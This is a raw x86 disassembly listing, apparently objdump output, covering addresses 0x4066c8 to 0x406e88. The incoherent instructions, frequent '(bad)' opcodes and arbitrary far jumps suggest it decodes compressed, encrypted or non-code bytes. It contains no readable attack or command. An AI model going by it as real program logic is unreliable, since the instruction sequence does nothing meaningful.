  4066c8:	mov    ebp,0x539112fd
  4066ce:	ins    BYTE PTR es:[edi],dx
  4066cf:	cli    
  4066d0:	dec    edi
  4066d1:	outs   dx,DWORD PTR ds:[esi]
  4066d2:	mov    esi,0x7428d911
  4066d7:	out    0x3e,eax
  4066d9:	lods   al,BYTE PTR ds:[esi]
  4066da:	jl     0x406759
  4066dc:	daa    
  4066dd:	lock dec BYTE PTR [edx-0x29]
  4066e1:	pop    ebp
  4066e2:	xchg   ebx,eax
  4066e3:	mov    dh,0xdd
  4066e5:	mov    ch,0x29
  4066e7:	push   ebp
  4066e8:	xchg   edi,eax
  4066e9:	xchg   edx,eax
  4066ea:	sbb    eax,0x22558257
  4066ef:	fisub  WORD PTR [ebx+0x466b927e]
  4066f5:	test   ebp,ebp
  4066f7:	mov    esp,0x1aef41c7
  4066fc:	cmp    bl,bl
  4066fe:	fidiv  DWORD PTR [esi]
  406700:	ficomp WORD PTR [ebx+edx*8]
  406703:	cmp    ah,BYTE PTR gs:[edi+0x79]
  406707:	in     al,0x7b
  406709:	and    DWORD PTR [edx-0x37],edi
  40670c:	cmp    esi,edi
  40670e:	xchg   ecx,eax
  40670f:	fwait
  406710:	loopne 0x4066e1
  406712:	stos   DWORD PTR es:[edi],eax
  406713:	pop    esp
  406714:	cdq    
  406715:	(bad)  
  406716:	nop
  406717:	pop    es
  406718:	push   0x75ef6da0
  40671d:	fldenv [esi]
  40671f:	inc    edi
  406720:	leave  
  406721:	sub    eax,0xfefa25c6
  406726:	dec    ebx
  406727:	stos   BYTE PTR es:[edi],al
  406728:	cmp    al,0x91
  40672a:	loope  0x4066fa
  40672c:	(bad)  
  40672f:	inc    si
  406731:	xchg   esi,eax
  406732:	fsubr  DWORD PTR [esi+ebp*4-0x1a]
  406736:	inc    ebp
  406737:	cmp    DWORD PTR [eax+0x16],esi
  40673a:	rcl    BYTE PTR [ecx+0x674fbc70],cl
  406740:	cwde   
  406741:	and    eax,0x180e534c
  406746:	mov    ?,WORD PTR [edx-0x60d183c3]
  40674c:	(bad)  
  40674d:	aas    
  40674e:	add    eax,0xcb9fa598
  406753:	xchg   esi,eax
  406754:	les    ecx,FWORD PTR [bp+si+0x71]
  406758:	push   cs
  406759:	cmp    eax,0xad26e2d7
  40675e:	xor    esp,ebx
  406760:	pop    esi
  406761:	jl     0x4067aa
  406763:	xlat   BYTE PTR ds:[ebx]
  406764:	push   ebx
  406765:	cmc    
  406766:	aaa    
  406767:	jnp    0x4066fe
  406769:	lods   eax,DWORD PTR ds:[esi]
  40676a:	push   esp
  40676b:	fidiv  DWORD PTR [esi-0x3]
  40676e:	sbb    cl,BYTE PTR [eax-0x12945e4d]
  406774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406775:	cwde   
  406776:	stos   DWORD PTR es:[edi],eax
  406777:	retf   0x4b3c
  40677a:	out    dx,al
  40677b:	outs   dx,DWORD PTR ds:[esi]
  40677c:	and    DWORD PTR [edx],eax
  40677e:	test   BYTE PTR ds:0x477508a9,ah
  406784:	in     eax,0x5c
  406786:	fwait
  406787:	(bad)  
  406788:	jmp    0x6fda:0xd1aaa858
  40678f:	imul   eax,DWORD PTR [ebx-0x5e03ddb0],0x7f
  406796:	bound  ebp,QWORD PTR [edi-0x5211bd9c]
  40679c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40679d:	inc    esp
  40679e:	bound  esi,QWORD PTR [ecx]
  4067a0:	adc    esp,DWORD PTR [esi-0x6b]
  4067a3:	jmp    0xba9e11bf
  4067a8:	stos   DWORD PTR es:[edi],eax
  4067a9:	or     DWORD PTR [eax+ebp*4],0x6eb27269
  4067b0:	xchg   BYTE PTR [ebx-0x239cf620],bh
  4067b6:	sub    eax,0x82c353d0
  4067bb:	or     DWORD PTR [ecx-0x5ffd5ca1],ecx
  4067c1:	retf   0xb828
  4067c4:	sub    al,0x3e
  4067c6:	xor    DWORD PTR [ebp-0x1e],esp
  4067c9:	jmp    0xf45fbf24
  4067ce:	(bad)  
  4067cf:	lods   al,BYTE PTR ds:[esi]
  4067d0:	aam    0xc4
  4067d2:	dec    eax
  4067d3:	mov    BYTE PTR [ebx],ah
  4067d5:	mov    bl,0x2d
  4067d7:	and    DWORD PTR [ecx-0x49],ecx
  4067da:	outs   dx,DWORD PTR ds:[esi]
  4067db:	mov    edi,0x82a53ddc
  4067e0:	jns    0x40681d
  4067e2:	mov    al,ds:0x4ccfa344
  4067e7:	retf   0x1b60
  4067ea:	mov    esi,fs
  4067ec:	mov    ebx,0x44a368bb
  4067f1:	push   ecx
  4067f2:	ja     0x40679a
  4067f4:	mul    BYTE PTR [edi-0x4a]
  4067f7:	mov    WORD PTR [edx-0x568fb327],?
  4067fd:	sbb    BYTE PTR [ebx-0xa9232e9],al
  406803:	inc    ecx
  406804:	push   0xee3d4639
  406809:	call   FWORD PTR [esp+edi*2-0x746b92eb]
  406810:	inc    ebx
  406811:	les    esi,FWORD PTR [edi-0x51]
  406814:	add    DWORD PTR [ecx+ecx*4],0xffffff80
  406818:	mov    al,ds:0x92138fe5
  40681d:	mov    dh,0xa0
  40681f:	sahf   
  406820:	mov    eax,0x7d0e10a1
  406825:	jo     0x406860
  406827:	repnz and ecx,ecx
  40682a:	fs adc eax,0x527de569
  406830:	(bad)  
  406831:	or     eax,DWORD PTR [esi-0x33]
  406834:	lea    ebp,[edi]
  406836:	test   eax,0x1b4ab67b
  40683b:	aam    0xd
  40683d:	adc    eax,0x227928cc
  406842:	or     DWORD PTR [eax],0x26ebdd15
  406848:	adc    edx,DWORD PTR ds:0x785e56d8
  40684e:	aaa    
  40684f:	jle    0x4068c6
  406851:	aas    
  406852:	popf   
  406853:	test   dh,dl
  406855:	bound  eax,QWORD PTR [ebp+0x19]
  406858:	jle    0x40682a
  40685a:	cld    
  40685b:	pop    edx
  40685c:	inc    esi
  40685d:	out    dx,eax
  40685e:	or     al,0x32
  406860:	pop    esi
  406861:	xchg   edi,eax
  406862:	loop   0x4068a6
  406864:	and    BYTE PTR [esi+esi*1-0x3b117aa1],dh
  40686b:	xlat   BYTE PTR ds:[ebx]
  40686c:	fwait
  40686d:	sub    cl,BYTE PTR [edx]
  40686f:	hlt    
  406870:	test   DWORD PTR ss:[ecx],ebp
  406873:	jecxz  0x40684d
  406875:	jge    0x4068c0
  406877:	xchg   esp,eax
  406878:	dec    esi
  406879:	pop    eax
  40687a:	mov    cl,0x2
  40687c:	mov    edi,0xfbaff9ee
  406881:	xor    al,0x78
  406883:	jecxz  0x406835
  406885:	(bad)  
  406886:	or     edi,DWORD PTR [eax+0x35]
  406889:	in     al,dx
  40688a:	out    0xc9,al
  40688c:	fnstcw WORD PTR [ebp-0x35adea5]
  406892:	cli    
  406893:	arpl   WORD PTR [edx],bp
  406895:	add    ebx,edi
  406897:	outs   dx,BYTE PTR ds:[esi]
  406898:	das    
  406899:	arpl   bx,bp
  40689b:	xchg   esi,eax
  40689c:	mov    BYTE PTR [eax-0x6f3e1601],dh
  4068a2:	sbb    ecx,DWORD PTR [ebx-0x6e11efce]
  4068a8:	call   0xcefeb64b
  4068ad:	arpl   WORD PTR ss:[ebx+0x63670333],bp
  4068b4:	fld    st(6)
  4068b6:	aam    0xa6
  4068b8:	fdivr  QWORD PTR [ebx+0x53292dce]
  4068be:	(bad)  
  4068bf:	mov    edx,DWORD PTR [eax+0x1b]
  4068c2:	cli    
  4068c3:	js     0x406925
  4068c5:	cmp    DWORD PTR [edi],0xffffffe1
  4068c8:	pop    ds
  4068c9:	inc    ecx
  4068ca:	div    BYTE PTR [ebx]
  4068cc:	adc    BYTE PTR [edi+0x3ebfe5b5],dh
  4068d2:	xchg   edx,eax
  4068d3:	int3   
  4068d4:	loop   0x4068b7
  4068d6:	inc    ecx
  4068d7:	mov    esp,0xf1268e12
  4068dc:	ss jmp 0x406861
  4068df:	retf   0x4841
  4068e2:	leave  
  4068e3:	loop   0x4068d0
  4068e5:	and    ebp,DWORD PTR [edi-0x4b1713b5]
  4068eb:	jle    0x4068bd
  4068ed:	imul   ebx,DWORD PTR ds:0xbfa95a6a,0xffffffe8
  4068f4:	popf   
  4068f5:	aas    
  4068f6:	jge    0x4068db
  4068f8:	mov    edi,0xabd15da7
  4068fd:	push   ebp
  4068fe:	ret    0x1e5c
  406901:	push   edx
  406902:	ja     0x4068a2
  406904:	stos   BYTE PTR es:[edi],al
  406905:	sub    al,0x5f
  406907:	mov    al,0xc2
  406909:	or     eax,0xf04599f9
  40690e:	pushf  
  40690f:	inc    edi
  406910:	sub    al,0x8f
  406912:	and    ebp,DWORD PTR [ecx+ebp*8-0x1]
  406916:	iret   
  406917:	scas   eax,DWORD PTR es:[edi]
  406918:	mov    ?,WORD PTR [eax+0x4a3d2730]
  40691e:	mov    edi,0x48d9c965
  406923:	shr    dh,0x47
  406926:	push   ds
  406927:	sub    cl,BYTE PTR [ecx+eiz*1+0x73867fa5]
  40692e:	mul    DWORD PTR [esi+0x6eeac1d0]
  406934:	cmp    BYTE PTR [esi-0x770e6c79],dh
  40693a:	dec    edi
  40693b:	or     DWORD PTR [esi+0x24d9e142],esp
  406941:	test   eax,0xc4f09785
  406946:	mov    dh,0xae
  406948:	mov    ecx,0x674ea62b
  40694d:	scas   eax,DWORD PTR es:[edi]
  40694e:	inc    ebp
  40694f:	popf   
  406950:	out    dx,eax
  406951:	mov    cl,BYTE PTR [eax+0x58]
  406954:	or     al,0x7f
  406956:	imul   edx,DWORD PTR [ebp+0x45],0x8dd8075f
  40695d:	mov    ah,0xe7
  40695f:	adc    ebp,DWORD PTR [ebx]
  406961:	icebp  
  406962:	das    
  406963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406964:	mov    gs,WORD PTR [ebp+0x12]
  406967:	xchg   edi,eax
  406968:	xor    BYTE PTR [edx-0x2d06ff54],ah
  40696e:	mov    DWORD PTR [eax+ecx*1-0x7b08a85e],ecx
  406975:	pop    edi
  406976:	dec    ecx
  406977:	js     0x406986
  406979:	xchg   ebx,eax
  40697a:	lods   eax,DWORD PTR ds:[esi]
  40697b:	push   ebx
  40697c:	bound  edx,QWORD PTR [ebx]
  40697e:	cmp    esp,DWORD PTR [esi-0x1]
  406981:	data16 outs dx,BYTE PTR ds:[esi]
  406983:	js     0x40692b
  406985:	sbb    DWORD PTR [esi],esi
  406987:	es das 
  406989:	pop    edx
  40698a:	xchg   edi,eax
  40698b:	jle    0x406916
  40698d:	dec    DWORD PTR [esi-0x33]
  406990:	es inc esp
  406992:	fst    QWORD PTR [ebx]
  406994:	push   ds
  406995:	mov    dh,0x6f
  406997:	es push ss
  406999:	sub    eax,0x493a6846
  40699e:	pop    esp
  40699f:	addr16 mov al,0x5c
  4069a2:	inc    BYTE PTR [esi]
  4069a4:	add    BYTE PTR [ecx],ch
  4069a6:	sbb    al,0x1a
  4069a8:	mov    DWORD PTR [edx-0x5],ecx
  4069ab:	pop    esp
  4069ac:	in     eax,0x88
  4069ae:	cwde   
  4069af:	xor    BYTE PTR [edi+esi*8],0x8f
  4069b3:	scas   al,BYTE PTR es:[edi]
  4069b4:	mov    ch,0x19
  4069b6:	push   0xfcdabfc
  4069bb:	inc    eax
  4069bc:	mov    bh,0x56
  4069be:	mov    ecx,0xb4669da7
  4069c3:	push   cs
  4069c4:	into   
  4069c5:	imul   ebx,DWORD PTR [edx-0x400f145d],0xfffffffb
  4069cc:	ins    BYTE PTR es:[edi],dx
  4069cd:	push   cs
  4069ce:	xor    BYTE PTR [esi+0x7e6bc643],ah
  4069d4:	data16 jno 0x406957
  4069d7:	push   ss
  4069d8:	(bad)  
  4069d9:	loope  0x406981
  4069db:	sub    dh,al
  4069dd:	adc    DWORD PTR [esi-0x77],0x624f16f1
  4069e4:	push   edx
  4069e5:	sub    ah,bh
  4069e7:	(bad)
  4069ea:	sti    
  4069eb:	adc    ch,BYTE PTR [ebx]
  4069ed:	mov    bh,0x8a
  4069ef:	scas   al,BYTE PTR es:[edi]
  4069f0:	repnz mov eax,0x4f63c437
  4069f6:	fs dec esi
  4069f8:	push   es
  4069f9:	scas   eax,DWORD PTR es:[edi]
  4069fa:	out    0xb1,al
  4069fc:	ds cmp eax,0x4a1694d0
  406a02:	(bad)  
  406a03:	cmp    al,0x17
  406a05:	sub    BYTE PTR [si],bl
  406a08:	or     eax,0xacdc5d12
  406a0d:	dec    ebx
  406a0e:	mov    cl,0x74
  406a10:	dec    ebp
  406a11:	mov    edi,esp
  406a13:	not    BYTE PTR [edi+esi*8-0x78]
  406a17:	mov    WORD PTR [eax+0x5b],ss
  406a1a:	test   DWORD PTR [edi],ebx
  406a1c:	sbb    ecx,esp
  406a1e:	jmp    0x8de4:0xc4ff1f18
  406a25:	sub    ebp,DWORD PTR [ebp-0x37]
  406a28:	stos   BYTE PTR es:[edi],al
  406a29:	iret   
  406a2a:	cmc    
  406a2b:	arpl   WORD PTR [esi+0xbb628ec],si
  406a31:	les    esp,FWORD PTR [ebx]
  406a33:	stc    
  406a34:	ffreep st(6)
  406a36:	pop    esi
  406a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a38:	dec    ebx
  406a39:	mov    eax,ds:0x292ecbdc
  406a3e:	std    
  406a3f:	mov    cl,0xe
  406a41:	in     eax,dx
  406a42:	cmc    
  406a43:	adc    dl,BYTE PTR [ebx-0x36]
  406a46:	jecxz  0x406ab1
  406a48:	data16 aas 
  406a4a:	lock and dl,BYTE PTR [ebp-0x10]
  406a4e:	dec    esi
  406a4f:	sbb    BYTE PTR [edi-0x16b99a59],dl
  406a55:	gs fwait
  406a57:	ret    
  406a58:	pop    edi
  406a59:	dec    ebx
  406a5a:	mov    al,ds:0x8314458a
  406a5f:	xchg   edx,eax
  406a60:	aam    0x6a
  406a62:	shr    ebx,0xaa
  406a65:	xchg   edi,eax
  406a66:	idiv   BYTE PTR [ebx]
  406a68:	(bad)  
  406a69:	popf   
  406a6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a6b:	or     al,BYTE PTR [esi-0x1fc27fce]
  406a71:	hlt    
  406a72:	out    dx,al
  406a73:	call   0x99f2:0x43ee2c70
  406a7a:	cwde   
  406a7b:	sub    DWORD PTR [edi],ebx
  406a7d:	push   0x3f
  406a7f:	sub    BYTE PTR [edx-0x6ca4e191],dh
  406a85:	dec    ebp
  406a86:	fbstp  TBYTE PTR [eax-0x177e8d50]
  406a8c:	mov    al,0x2e
  406a8e:	inc    esp
  406a8f:	dec    ebx
  406a90:	pusha  
  406a91:	sub    al,0x35
  406a93:	(bad)  
  406a95:	ja     0x406a31
  406a97:	add    ah,ch
  406a99:	jb     0x406a73
  406a9b:	and    eax,0x2afe183a
  406aa0:	pop    ebx
  406aa1:	(bad)  
  406aa3:	mov    esi,0xa78a0cf4
  406aa8:	mov    ebp,0x544ca39f
  406aad:	mov    ebx,0x6bf84e17
  406ab2:	into   
  406ab3:	xlat   BYTE PTR es:[ebx]
  406ab5:	mov    al,ds:0xb893f4b6
  406aba:	mov    edi,0xafbcdcf1
  406abf:	ins    BYTE PTR es:[edi],dx
  406ac0:	cli    
  406ac1:	xchg   BYTE PTR [esi-0x5239e219],ah
  406ac7:	loope  0x406ad2
  406ac9:	iret   
  406aca:	dec    esi
  406acb:	mov    ecx,0xabaf706f
  406ad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ad2:	in     al,dx
  406ad3:	mov    eax,ds:0x7f388bac
  406ad8:	cmp    BYTE PTR [eax+eax*8+0x3a8609b4],0xe8
  406ae0:	std    
  406ae1:	adc    BYTE PTR [edx-0x644905af],dh
  406ae7:	ins    BYTE PTR es:[edi],dx
  406ae8:	cmp    eax,DWORD PTR [esi+ebx*8+0x7d]
  406aec:	in     eax,dx
  406aed:	push   edi
  406aee:	or     edx,DWORD PTR [ebp-0x1b]
  406af1:	or     BYTE PTR [edi+0x5700c5f2],ch
  406af7:	jmp    0xd52:0x3100c221
  406afe:	in     eax,dx
  406aff:	mov    ds:0xffadf2d2,al
  406b04:	mov    ah,BYTE PTR [edi+0x6ed5f2dc]
  406b0a:	and    BYTE PTR [esi-0x54],ch
  406b0d:	mov    esi,esp
  406b0f:	aas    
  406b10:	(bad)  
  406b11:	jbe    0x406ae4
  406b13:	out    dx,al
  406b14:	cmp    esp,edi
  406b16:	fidivr WORD PTR [esi]
  406b18:	arpl   WORD PTR [esi-0x80],si
  406b1b:	or     cl,bh
  406b1d:	inc    eax
  406b1e:	mov    dh,0x2e
  406b20:	mov    edi,0xa0586b0a
  406b25:	add    eax,0x7e9e1885
  406b2a:	push   es
  406b2b:	xchg   edx,eax
  406b2c:	inc    esp
  406b2d:	add    eax,0xc58ce972
  406b32:	add    esi,DWORD PTR [eax]
  406b34:	mov    ds:0x50fbca46,al
  406b39:	into   
  406b3a:	icebp  
  406b3b:	and    BYTE PTR [edi-0x1f],bl
  406b3e:	mov    al,ds:0x76b3285f
  406b43:	sub    bl,dh
  406b45:	enter  0x100,0xf7
  406b49:	inc    esi
  406b4a:	popf   
  406b4b:	add    BYTE PTR [edi],ch
  406b4d:	(bad)  
  406b4e:	hlt    
  406b4f:	xor    DWORD PTR [ebx-0x4b],eax
  406b52:	pop    ebx
  406b53:	jmp    0xfd73e55e
  406b58:	fnop   
  406b5a:	jno    0x406bd3
  406b5c:	popf   
  406b5d:	call   0x5213a2f7
  406b62:	imul   esi,edx,0x85c3cf04
  406b68:	inc    ebp
  406b69:	cmp    al,0x24
  406b6b:	stos   BYTE PTR es:[edi],al
  406b6c:	nop
  406b6d:	mov    ds:0x13602c52,eax
  406b72:	xchg   edx,eax
  406b73:	mov    eax,0x3c17193b
  406b78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b79:	cmp    BYTE PTR [ebx-0xbd52455],al
  406b7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b80:	push   edi
  406b81:	mov    al,dh
  406b83:	or     ch,dl
  406b85:	not    DWORD PTR [ebp+0x14]
  406b88:	mov    dh,0x5
  406b8a:	dec    eax
  406b8b:	add    BYTE PTR [edi+0x22269f2a],0x79
  406b92:	test   al,0xed
  406b94:	adc    DWORD PTR [ecx-0x45608197],esi
  406b9a:	mov    ebx,eax
  406b9c:	mov    ?,edi
  406b9e:	mov    dl,BYTE PTR [eax-0x5]
  406ba1:	retf   
  406ba2:	call   0x6f00:0x19ce6286
  406ba9:	lods   eax,DWORD PTR ds:[esi]
  406baa:	sti    
  406bab:	aas    
  406bac:	shl    DWORD PTR [eax+0x66e169f1],1
  406bb2:	ret    0xfe9e
  406bb5:	in     al,dx
  406bb6:	scas   al,BYTE PTR es:[edi]
  406bb7:	xor    dh,BYTE PTR [ebx]
  406bb9:	adc    DWORD PTR [ecx+0x55],edi
  406bbc:	cmp    eax,ebp
  406bbe:	mov    edx,0x5be5d97c
  406bc3:	cmp    eax,0x49854afe
  406bc8:	xor    DWORD PTR [ecx+0x72],ebx
  406bcb:	(bad)  
  406bcc:	or     eax,0x781b8e1
  406bd1:	or     eax,0xf7833be0
  406bd6:	pop    ebp
  406bd7:	cmp    al,0x6f
  406bd9:	xchg   BYTE PTR [ebx-0x4c52d6f4],bl
  406bdf:	inc    esi
  406be0:	leave  
  406be1:	xchg   edx,eax
  406be2:	mov    eax,0x936c07c2
  406be7:	xor    BYTE PTR [ebp-0x149871],dl
  406bed:	out    dx,eax
  406bee:	pop    esp
  406bef:	test   al,0x24
  406bf1:	push   esp
  406bf2:	push   cs
  406bf3:	jecxz  0x406bfe
  406bf5:	cdq    
  406bf6:	xor    dl,BYTE PTR [ebp-0x9]
  406bf9:	mov    dl,0x7
  406bfb:	push   ds
  406bfc:	lods   eax,DWORD PTR ds:[esi]
  406bfd:	js     0x406bd8
  406bff:	popf   
  406c00:	imul   esi,DWORD PTR ds:0x519eae9e,0x7f
  406c07:	leave  
  406c08:	pusha  
  406c09:	push   cs
  406c0a:	imul   eax,ebx,0xffffffbc
  406c0d:	stos   DWORD PTR es:[edi],eax
  406c0e:	arpl   sp,ax
  406c10:	fstp   DWORD PTR [edi]
  406c12:	clc    
  406c13:	cmp    BYTE PTR [edx+eax*1],ch
  406c16:	js     0x406c55
  406c18:	fcomp  QWORD PTR [edi-0x1f235646]
  406c1e:	cwde   
  406c1f:	rol    eax,1
  406c21:	fbld   TBYTE PTR [edi-0x70ec2c4]
  406c27:	xchg   edx,eax
  406c28:	(bad)  
  406c29:	int    0x57
  406c2b:	test   ecx,ecx
  406c2d:	push   ss
  406c2e:	je     0x406bb2
  406c30:	push   ecx
  406c31:	jae    0x406c3c
  406c33:	jae    0x406c26
  406c35:	in     al,0x5e
  406c37:	xchg   BYTE PTR [eax-0x22ea1a4a],ah
  406c3d:	inc    edi
  406c3e:	leave  
  406c3f:	and    al,0xb4
  406c41:	and    eax,0x588ecb92
  406c46:	mov    edx,0x86fbf83d
  406c4b:	or     eax,0xe248acda
  406c50:	inc    ebx
  406c51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c52:	jle    0x406bf1
  406c54:	pop    eax
  406c55:	or     esi,DWORD PTR [edi-0x23c241d6]
  406c5b:	addr16 nop
  406c5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c5e:	inc    ebx
  406c5f:	ret    0xe484
  406c62:	add    ch,BYTE PTR [ecx-0x47d7f4a5]
  406c68:	pop    esp
  406c69:	popa   
  406c6a:	or     al,0x2d
  406c6c:	in     eax,dx
  406c6d:	cmp    eax,0x4b7176fe
  406c72:	popa   
  406c73:	push   ebp
  406c74:	clc    
  406c75:	push   0xce895727
  406c7a:	daa    
  406c7b:	push   eax
  406c7c:	adc    al,0xaf
  406c7e:	dec    edx
  406c7f:	sbb    dl,BYTE PTR [ebx-0x299d3fbe]
  406c85:	fst    st(4)
  406c87:	cmp    DWORD PTR ds:0x4ed2004f,eax
  406c8d:	ror    DWORD PTR [edx+0x72],1
  406c90:	fsubrp st(2),st
  406c92:	shl    BYTE PTR [edi+ebx*1-0x49780c37],0x58
  406c9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c9b:	add    bl,ch
  406c9d:	dec    eax
  406c9e:	xchg   edi,eax
  406c9f:	mov    edi,0xfad03d27
  406ca4:	mov    cl,0x33
  406ca6:	mov    eax,DWORD PTR [edx-0x54499acd]
  406cac:	jp     0x406c7e
  406cae:	je     0x406c39
  406cb0:	lods   al,BYTE PTR ds:[esi]
  406cb1:	jne    0x406c9e
  406cb3:	fdivr  st,st(2)
  406cb5:	adc    DWORD PTR [edx-0x55f4bf2f],0xffffff9c
  406cbc:	outs   dx,BYTE PTR ds:[esi]
  406cbd:	mov    ds:0x891e8d19,eax
  406cc2:	pusha  
  406cc3:	jae    0x406c96
  406cc5:	fsub   st(6),st
  406cc7:	dec    esp
  406cc8:	ficom  DWORD PTR [ecx-0x7d97e093]
  406cce:	nop
  406ccf:	fsub   QWORD PTR [esi+0x1a82b382]
  406cd5:	mov    bh,0x93
  406cd7:	popf   
  406cd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cd9:	xchg   edx,eax
  406cda:	push   ebx
  406cdb:	stos   DWORD PTR es:[edi],eax
  406cdc:	cs inc edi
  406cde:	out    dx,al
  406cdf:	cmp    ebx,DWORD PTR [esi]
  406ce1:	scas   al,BYTE PTR es:[edi]
  406ce2:	mov    al,ds:0x10139217
  406ce7:	retf   0x2dcd
  406cea:	adc    DWORD PTR [ecx-0x375004ec],esp
  406cf0:	push   ss
  406cf1:	inc    edx
  406cf2:	jnp    0x406d6d
  406cf4:	repz aam 0x2b
  406cf7:	mul    ah
  406cf9:	hlt    
  406cfa:	mov    ecx,0xe62c2b9d
  406cff:	inc    ecx
  406d00:	adc    al,BYTE PTR [esi+0x6a]
  406d03:	(bad)  
  406d05:	(bad)  
  406d06:	jge    0x406d62
  406d08:	inc    edi
  406d09:	dec    eax
  406d0a:	aaa    
  406d0b:	jl     0x406cea
  406d0d:	dec    ecx
  406d0e:	inc    eax
  406d0f:	mov    eax,ds:0xa3697ff7
  406d14:	loope  0x406caa
  406d16:	mov    ecx,0x38d55f32
  406d1b:	cmp    DWORD PTR [esp+eax*2+0x2f],ecx
  406d1f:	jne    0x406ca4
  406d21:	enter  0x4b4d,0x9f
  406d25:	cmp    eax,0x428a26f8
  406d2a:	(bad)  
  406d2b:	scas   eax,DWORD PTR es:[edi]
  406d2c:	aaa    
  406d2d:	mov    edx,DWORD PTR [eax+0x208f9bf8]
  406d33:	cli    
  406d34:	sahf   
  406d35:	aaa    
  406d36:	cs xchg esp,eax
  406d38:	add    BYTE PTR [ecx+0x6744ed69],bl
  406d3e:	sub    ebx,DWORD PTR [ecx-0x95e8740]
  406d44:	shl    DWORD PTR [ecx],0xd0
  406d47:	add    al,0xf6
  406d49:	ds out dx,eax
  406d4b:	add    BYTE PTR [eax-0x6870c0bb],0x65
  406d52:	lahf   
  406d53:	push   es
  406d54:	dec    ebx
  406d55:	jecxz  0x406d19
  406d57:	pop    es
  406d58:	call   0xa0409663
  406d5d:	pop    esp
  406d5e:	and    al,0x4
  406d60:	xor    eax,0x65fbdcdd
  406d65:	(bad)  
  406d66:	shr    BYTE PTR [esi-0x109e986],1
  406d6c:	std    
  406d6d:	push   edi
  406d6e:	or     bl,dl
  406d70:	and    ebx,ecx
  406d72:	xchg   DWORD PTR fs:[eax+0xa],ebp
  406d76:	sub    bl,BYTE PTR [eax]
  406d78:	ja     0x406d0b
  406d7a:	xchg   ebp,eax
  406d7b:	sub    dl,bh
  406d7d:	lods   al,BYTE PTR ds:[esi]
  406d7e:	adc    ah,bh
  406d80:	push   cs
  406d81:	cmp    bh,BYTE PTR [ebx-0x33bef4ad]
  406d87:	(bad)  
  406d88:	sub    ebx,DWORD PTR [esi+0x36]
  406d8b:	rcr    dh,cl
  406d8d:	(bad)  
  406d8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d8f:	mov    ebx,DWORD PTR [ebp+0x7eaa8c30]
  406d95:	fisubr WORD PTR [ebp+0x3]
  406d98:	adc    eax,0x2ac67cdf
  406d9d:	inc    esi
  406d9e:	loopne 0x406d99
  406da0:	ficomp WORD PTR ds:0x5a1616ee
  406da6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406da7:	dec    ebx
  406da8:	js     0x406d89
  406daa:	sub    DWORD PTR [eax+eax*2+0x61],ecx
  406dae:	xchg   BYTE PTR [eax-0x1f34546d],bh
  406db4:	imul   ebx,DWORD PTR [esp+eax*2+0x23c4e32f],0x66
  406dbc:	cdq    
  406dbd:	xchg   esp,eax
  406dbe:	adc    bl,BYTE PTR [ebx]
  406dc0:	js     0x406d69
  406dc2:	stc    
  406dc3:	js     0x406ddd
  406dc5:	and    ebp,ebp
  406dc7:	(bad)  
  406dc8:	mov    edx,0xae7dcf95
  406dcd:	fistp  DWORD PTR [ebx]
  406dcf:	pop    edx
  406dd0:	aad    0x10
  406dd2:	mov    dl,0xf8
  406dd4:	ins    BYTE PTR es:[edi],dx
  406dd5:	(bad)  
  406dd6:	sti    
  406dd7:	sub    bl,BYTE PTR [eax]
  406dd9:	pop    ebx
  406dda:	rcl    bh,1
  406ddc:	jge    0x406d6c
  406dde:	jae    0x406e56
  406de0:	mov    eax,ds:0xea693ff7
  406de5:	das    
  406de6:	add    cl,bl
  406de8:	popa   
  406de9:	or     BYTE PTR [eax-0x8],dl
  406dec:	mov    al,0x77
  406dee:	or     eax,0x977ce3eb
  406df3:	cmc    
  406df4:	sbb    edx,ebx
  406df6:	push   ebx
  406df7:	jmp    0x406e04
  406df9:	cmp    esp,DWORD PTR [ecx-0x3a]
  406dfc:	ins    BYTE PTR es:[edi],dx
  406dfd:	cmp    al,BYTE PTR [ebp+0x1b]
  406e00:	lods   al,BYTE PTR ds:[esi]
  406e01:	pop    ebp
  406e02:	inc    ebp
  406e03:	or     BYTE PTR [eax-0x2822ab2],ah
  406e09:	ds inc edi
  406e0b:	mov    dl,0x4e
  406e0d:	jo     0x406e18
  406e0f:	ins    BYTE PTR es:[edi],dx
  406e10:	dec    edi
  406e11:	out    dx,eax
  406e12:	jne    0x406e28
  406e14:	pop    ecx
  406e15:	xor    eax,0x16b60fd3
  406e1a:	call   0xb9e4:0xfc2afce1
  406e21:	(bad)  
  406e22:	and    DWORD PTR [ecx-0x14114fa2],ebx
  406e28:	out    dx,al
  406e29:	push   eax
  406e2a:	mov    eax,0xf09fe0a1
  406e2f:	scas   eax,DWORD PTR es:[edi]
  406e30:	mov    dl,0x92
  406e32:	or     ebp,DWORD PTR [edx]
  406e34:	jmp    0x406e6f
  406e36:	fild   DWORD PTR [ebx-0x5da16d16]
  406e3c:	in     eax,0x6e
  406e3e:	add    eax,0x486233cb
  406e43:	stos   BYTE PTR es:[edi],al
  406e44:	jbe    0x406e74
  406e46:	daa    
  406e47:	sub    esp,edx
  406e49:	and    edx,edi
  406e4b:	arpl   WORD PTR [ecx],ax
  406e4d:	jl     0x406e45
  406e4f:	fsub   QWORD PTR [eax+0xe0fedb0]
  406e55:	int    0x19
  406e57:	jmp    DWORD PTR [ecx-0x197a4515]
  406e5d:	das    
  406e5e:	test   BYTE PTR [esi],dh
  406e60:	push   ebp
  406e61:	mov    edi,0xe2db9e15
  406e66:	add    ebp,esi
  406e68:	icebp  
  406e69:	ret    0xc678
  406e6c:	xchg   edi,eax
  406e6d:	mov    ebp,0xe3eed25f
  406e72:	imul   edi,DWORD PTR [eax+0x10fb77e3],0x556fce58
  406e7c:	mov    cl,0xb7
  406e7e:	xchg   DWORD PTR [eax+0x3657b1],eax
  406e84:	loop   0x406edf
  406e86:	sub    al,0xa2
  406e88:	mov    esi,0x63671622
